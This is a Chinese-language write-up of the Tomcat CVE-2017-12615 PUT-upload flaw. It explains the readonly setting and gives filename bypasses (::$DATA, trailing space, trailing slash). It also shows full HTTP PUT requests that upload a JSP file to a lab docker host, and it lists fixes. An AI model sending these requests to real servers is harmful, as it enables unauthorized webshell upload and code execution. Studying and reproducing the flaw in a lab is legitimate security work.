#### CVE-2017-12615

##### 漏洞描述

远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。

##### 影响范围

Apache Tomcat 7.0.0 – 7.0.79

##### 漏洞原理

启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端

默认`readonly`为`true`，也就是无法进行PUT、DELETE行为

````
conf/web.xml		//文件内容
````

![image-20200813095843352](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813095843352.png)

这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：

![image-20200813100218371](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813100218371.png)

可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。

绕过方式：

Windows：  
1、利用/shell.jsp::$DATA的方式绕过  
2、/shell.jsp%20，空格绕过  
3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/  
Linux：  
1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/

##### 漏洞条件

`readonly`设置为`false`时会导致攻击者上传任意恶意文件。

##### 漏洞检测

漏洞环境使用[P牛docker](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)镜像验证。

![image-20200813140738965](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images/image-20200813140738965.png)

Tomcat version: 8.5.19

将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。

1、readonly默认值为true，手动将其改为false，在`conf/web.xml`中手动添加红色方框类内容。

添加如下：

```xml
				<init-param> 
            <param-name>readonly</param-name> 
            <param-value>false</param-value> 
        </init-param>
```

![image-20200813100605923](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813100605923.png)

2、修改请求头并传递post数据

```
PUT /shell.jsp HTTP/1.1
Host: 192.168.3.49:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 5

shell
```

![image-20200813131648712](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813131648712.png)

由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。

此时可以利用上面介绍的绕过方式

利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）

```
PUT /shell.jsp/ HTTP/1.1
Host: 192.168.3.49:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 5

shell
```

下图所示修改shell.jsp/即可上传成功

![image-20200813131744168](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813131744168.png)

文件访问

![image-20200813133423171](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813133423171.png)

shell管理

![image-20200813134428832](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2017-12615/images//image-20200813134428832.png)

##### 漏洞修复

1、删除web.xml文件中readonly属性的值为true或直接删除

2、更新至官方最新

